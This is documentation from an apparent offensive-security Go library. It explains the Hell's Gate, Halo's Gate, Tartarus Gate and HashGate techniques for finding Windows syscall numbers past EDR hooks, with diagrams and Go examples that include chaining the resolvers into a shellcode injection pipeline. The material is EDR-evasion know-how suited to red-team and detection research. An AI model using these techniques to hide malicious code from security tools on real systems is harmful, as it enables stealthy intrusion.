---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# SSN Resolvers: Hell's Gate, Halo's Gate, Tartarus Gate, HashGate

[<- Back to Syscalls Overview](README.md)

**MITRE ATT&CK:** [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)
**D3FEND:** [D3-SCA - System Call Analysis](https://d3fend.mitre.org/technique/d3f:SystemCallAnalysis/)

---

## What SSN resolvers are NOT

> [!IMPORTANT]
> SSN resolvers is **only** the syscall-number-discovery axis
> (concern #2 in [README.md](README.md)). It answers "where does
> the syscall service number come from when the canonical source
> (the unhooked ntdll prologue) is unavailable?".
>
> It does **not** decide:
>
> - **how the syscall fires once the SSN is known** — that's the
>   calling method ([direct-indirect.md](direct-indirect.md)).
>   `HellsGate` is happy to feed an SSN to `MethodWinAPI` — the
>   call still goes through every hook.
> - **how the Nt\* export is identified** — that's
>   [api-hashing.md](api-hashing.md). `HashGate` is the resolver
>   that *uses* api-hashing internally; the rest still need a
>   plaintext name.
>
> Switching from `HellsGate` to `TartarusGate` does not change
> what hooks see; it only changes where the SSN was read. Pair
> the resolver with the calling method that matches your
> stealth target.

## Primer

Every Windows kernel function has a secret number called the SSN (Syscall Service Number). When you want to call the kernel directly (bypassing EDR hooks), you need to know this number. The problem is, these numbers are not documented and change between Windows versions.

**Each NT function has a secret number -- these resolvers figure out the number even when guards try to hide it.** Think of it like a secret menu at a restaurant. Hell's Gate reads the number directly from the menu (if nobody has covered it up). Halo's Gate checks the neighboring items on the menu to figure out what your item's number must be. Tartarus Gate follows the "see other page" redirect that the guards placed over the menu. HashGate uses a codebook to find the menu item without even knowing its name.

---

## How It Works

Every resolver answers the same question — "what SSN does `NtXxx` map to on this host?" — but with different assumptions about how tampered the in-process ntdll is.

```mermaid
flowchart LR
    A["Need SSN for NtXxx"] --> B[Resolver.Resolve]
    B --> C[ntdll base via<br>GetProcAddress or PEB walk]
    C --> D[Read function prologue]
    D --> E{Intact?<br>4C 8B D1 B8}
    E -->|Yes| F[SSN = bytes 4-5]
    E -->|No| G[Strategy fallback:<br>neighbors / JMP follow / hash]
    G --> F
    F --> H[caller.Call builds<br>syscall stub]
```

- **Hell's Gate** — read `mov eax, imm32` directly from the unhooked prologue. Fastest, fails on any hooked function.
- **Halo's Gate** — target hooked? scan neighbours (±500 stubs × 32 bytes). Since SSNs are sequential in ntdll, an unhooked neighbour N stubs away implies `target_SSN = neighbour_SSN ± N`.
- **Tartarus' Gate** — target patched with `E9 xx xx xx xx` or `EB xx`? follow the JMP into the EDR trampoline; most trampolines restore `mov eax, imm32` before the real `syscall` instruction.
- **Hash-based (HashGate)** — resolve the function address itself via PEB walk + ROR13 export hashing. No `"NtAllocateVirtualMemory"` string anywhere in the binary. Falls back to Hell's Gate for SSN extraction once the address is found.
- **Chain** — compose resolvers (e.g. Tartarus → HashGate → Halo's); first success wins, giving layered resilience without reimplementing the strategies individually.

---

## How Each Resolver Works

### The ntdll Prologue

Every unhooked NT function in ntdll starts with the same byte pattern:

```asm
4C 8B D1          mov r10, rcx       ; save first argument
B8 XX XX 00 00    mov eax, <SSN>     ; load syscall number
...
0F 05             syscall            ; enter kernel
C3                ret
```

The SSN is the two bytes at offset `+4` and `+5`. All resolvers ultimately extract these bytes.

### Decision Tree

```mermaid
flowchart TD
    START["Need SSN for\nNtXxxFunction"] --> CHECK{"Is the prologue\nintact?\n(4C 8B D1 B8)"}

    CHECK -->|"Yes, bytes match"| HELLS["HellsGate\nRead SSN directly\nfrom bytes 4-5"]
    CHECK -->|"No, bytes modified"| HOOKTYPE{"What replaced\nthe prologue?"}

    HOOKTYPE -->|"E9 xx xx xx xx\n(near JMP)"| TART_JMP["TartarusGate\nFollow JMP displacement\nto trampoline code"]
    HOOKTYPE -->|"EB xx\n(short JMP)"| TART_SHORT["TartarusGate\nFollow short JMP\nto trampoline"]
    HOOKTYPE -->|"Unknown patch\n(INT3, NOP sled, etc.)"| HALOS["HalosGate\nScan neighboring stubs\n(+/- 500 * 32 bytes)"]

    TART_JMP --> TRAMP{"Trampoline has\nmov eax, imm32?"}
    TART_SHORT --> TRAMP
    TRAMP -->|"Yes, found B8 XX XX"| TART_OK["SSN extracted\nfrom trampoline"]
    TRAMP -->|"No, unrecognized code"| HALOS

    HALOS --> NEIGHBOR{"Found unhooked\nneighbor within\n500 stubs?"}
    NEIGHBOR -->|"Yes: neighbor SSN = X\nat offset N"| CALC["Target SSN =\nX +/- N"]
    NEIGHBOR -->|"No neighbors\nunhooked"| FAIL["Resolution failed"]

    HELLS --> SUCCESS["SSN resolved"]
    TART_OK --> SUCCESS
    CALC --> SUCCESS

    style SUCCESS fill:#4a9,color:#fff
    style FAIL fill:#f66,color:#fff
    style HELLS fill:#49a,color:#fff
    style HALOS fill:#a94,color:#fff
    style TART_JMP fill:#94a,color:#fff
    style TART_SHORT fill:#94a,color:#fff
```

---

### Hell's Gate

The simplest resolver. Reads the SSN directly from the unhooked function prologue.

```mermaid
flowchart LR
    A["ntdll!NtCreateThreadEx"] --> B["Read bytes 0-7"]
    B --> C{"4C 8B D1 B8?"}
    C -->|Yes| D["SSN = bytes[4] | bytes[5]<<8"]
    C -->|No| E["ERROR: hooked"]

    style D fill:#4a9,color:#fff
    style E fill:#f66,color:#fff
```

**When to use:** You know ntdll is not hooked (e.g., you loaded a fresh copy from disk, or the target has no EDR).

**Fails when:** Any EDR has patched the function prologue (the most common hooking strategy).

### Halo's Gate

Extends Hell's Gate by exploiting the fact that SSNs are sequential in ntdll. If `NtCreateThreadEx` is hooked but the function 3 stubs above it (`NtCreateFile`, SSN=0x55) is not, then `NtCreateThreadEx`'s SSN is `0x55 + 3`.

```mermaid
flowchart TD
    A["Target: NtCreateThreadEx\n(hooked, can't read SSN)"] --> B["Scan UP: addr - 32"]
    A --> C["Scan DOWN: addr + 32"]

    B --> D{"Unhooked?\n4C 8B D1 B8?"}
    C --> E{"Unhooked?\n4C 8B D1 B8?"}

    D -->|"Yes at offset -3"| F["Neighbor SSN = 0x55\nTarget = 0x55 + 3 = 0x58"]
    E -->|"Yes at offset +2"| G["Neighbor SSN = 0x5A\nTarget = 0x5A - 2 = 0x58"]
    D -->|No| H["Try next neighbor\n(up to 500)"]
    E -->|No| H

    style F fill:#4a9,color:#fff
    style G fill:#4a9,color:#fff
```

**When to use:** EDR hooks your target function but leaves some neighbors unhooked.

**Fails when:** All 1000 neighboring stubs (500 up, 500 down) are hooked. Extremely unlikely in practice.

### Tartarus Gate

Extends Hell's and Halo's Gate by understanding JMP hooks. When an EDR patches a function with `E9 xx xx xx xx` (near JMP) or `EB xx` (short JMP), Tartarus follows the jump to the EDR's trampoline code. The trampoline typically restores the original `mov eax, <SSN>` instruction before executing the syscall, so Tartarus scans the trampoline for the `B8 XX XX` pattern.

```mermaid
flowchart TD
    A["Target function bytes:\nE9 4F 01 00 00 ..."] --> B["Near JMP detected"]
    B --> C["displacement = 0x0000014F"]
    C --> D["hookDest = addr + 5 + displacement"]
    D --> E["Scan trampoline\nfor B8 XX XX pattern"]
    E -->|"Found at offset +12"| F["SSN = trampoline[13] |\ntrampoline[14]<<8"]
    E -->|"Not found"| G["Fall back to\nHalo's Gate scanning"]

    style F fill:#4a9,color:#fff
    style G fill:#a94,color:#fff
```

**When to use:** Default choice for maximum resilience. Handles unhooked, JMP-hooked, and partially hooked ntdll.

**Fails when:** The trampoline code does not contain a recognizable `mov eax, imm32` AND all neighbors are also hooked.

### HashGate

Resolves the function address via PEB walk + ROR13 export hashing instead of `ntdll.NewProc(name)`. This eliminates string-based resolution entirely -- no `"NtAllocateVirtualMemory"` in the binary.

Once the function address is found via hash, SSN extraction uses the same Hell's Gate prologue check.

```mermaid
flowchart TD
    A["Function name:\nNtCreateThreadEx"] --> B["ROR13 hash:\n0x4D1DEB74"]
    B --> C["PEB walk:\nfind ntdll base via\nmodule hash 0x411677B7"]
    C --> D["Walk PE exports:\nhash each name with ROR13"]
    D --> E{"Hash matches\n0x4D1DEB74?"}
    E -->|Yes| F["Function address found"]
    F --> G{"Prologue intact?\n4C 8B D1 B8?"}
    G -->|Yes| H["SSN extracted"]
    G -->|No| I["ERROR: hooked\n(no neighbor scanning)"]

    style H fill:#4a9,color:#fff
    style I fill:#f66,color:#fff
    style B fill:#a94,color:#fff
```

**When to use:** When you need string-free resolution. Combine with `Chain()` for hook resilience.

**Fails when:** The function is hooked (no neighbor scanning built in -- use `Chain()` with HalosGate for fallback).

---

## Usage

### Individual Resolvers

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// Hell's Gate -- fast, simple, fails on hooked functions
hg := wsyscall.NewHellsGate()
ssn, err := hg.Resolve("NtCreateThreadEx")

// Halo's Gate -- neighbor scanning fallback
hag := wsyscall.NewHalosGate()
ssn, err := hag.Resolve("NtCreateThreadEx")

// Tartarus Gate -- JMP hook trampoline + neighbor fallback
tg := wsyscall.NewTartarus()
ssn, err := tg.Resolve("NtCreateThreadEx")

// HashGate -- string-free PEB walk resolution
hgr := wsyscall.NewHashGate()
ssn, err := hgr.Resolve("NtCreateThreadEx")
```

### Chain: Compose Resolvers

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// Try Tartarus first (handles JMP hooks), fall back to HashGate,
// then Halo's Gate as last resort
resolver := wsyscall.Chain(
    wsyscall.NewTartarus(),
    wsyscall.NewHashGate(),
    wsyscall.NewHalosGate(),
)

caller := wsyscall.New(wsyscall.MethodIndirect, resolver)
defer caller.Close()

ret, err := caller.Call("NtAllocateVirtualMemory", /* args... */)
```

### With Injection Pipeline

```go
import (
    "context"

    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Resilient resolver chain for hostile EDR environments
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(
        wsyscall.NewTartarus(),
        wsyscall.NewHalosGate(),
    ),
)
defer caller.Close()

pipe := inject.NewPipeline(caller)
err := pipe.Inject(context.Background(), shellcode,
    inject.WithMethod(inject.MethodCreateThread),
)
```

---

## Combined Example: Resolver Resilience Test

```go
package main

import (
    "fmt"

    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    functions := []string{
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWriteVirtualMemory",
    }

    resolvers := map[string]wsyscall.SSNResolver{
        "HellsGate":   wsyscall.NewHellsGate(),
        "HalosGate":   wsyscall.NewHalosGate(),
        "TartarusGate": wsyscall.NewTartarus(),
        "HashGate":    wsyscall.NewHashGate(),
    }

    for name, resolver := range resolvers {
        fmt.Printf("\n--- %s ---\n", name)
        for _, fn := range functions {
            ssn, err := resolver.Resolve(fn)
            if err != nil {
                fmt.Printf("  %s: FAILED (%v)\n", fn, err)
            } else {
                fmt.Printf("  %s: SSN=0x%04X\n", fn, ssn)
            }
        }
    }
}
```

---

## Advantages & Limitations

### Advantages

- **Layered resilience**: `Chain()` composes resolvers so the first successful one wins
- **JMP-hook aware**: Tartarus Gate follows EDR trampolines that other resolvers cannot handle
- **String-free option**: HashGate eliminates all plaintext function names
- **Zero external dependencies**: Pure Go + unsafe pointer arithmetic, no CGo or assembly files
- **Thread-safe**: HashGate uses `sync.Once` for lazy initialization; Caller uses `sync.Mutex` for stubs

### Limitations

- **Hell's Gate**: Fails on any hooked function -- too fragile for production use alone
- **Halo's Gate**: Assumes 32-byte stub alignment -- non-standard ntdll layouts break it
- **Tartarus Gate**: Cannot handle inline hooks that do not contain a recognizable `mov eax, imm32`
- **HashGate**: No hook resilience -- combine with Halo's/Tartarus via `Chain()` for robustness
- **All resolvers**: x64 only; SSN offsets and stub layouts differ on x86 and ARM64

---

## API Reference

### SSNResolver Interface

```go
type SSNResolver interface {
    Resolve(ntFuncName string) (uint16, error)
}
```

### Resolvers

```go
// HellsGateResolver reads SSN from unhooked ntdll prologue.
func NewHellsGate() *HellsGateResolver

// HalosGateResolver scans neighboring stubs when target is hooked.
func NewHalosGate() *HalosGateResolver

// TartarusGateResolver follows JMP hooks to extract SSN from trampoline.
func NewTartarus() *TartarusGateResolver

// HashGateResolver resolves via PEB walk + ROR13 hashing (no strings).
func NewHashGate() *HashGateResolver

// Chain tries multiple resolvers in sequence, returning first success.
func Chain(resolvers ...SSNResolver) *ChainResolver
```

## See also

- [Syscalls area README](README.md)
- [`syscalls/api-hashing.md`](api-hashing.md) — HashGate uses these primitives to find Nt* exports
- [`syscalls/direct-indirect.md`](direct-indirect.md) — once the SSN is known, this is how the syscall fires
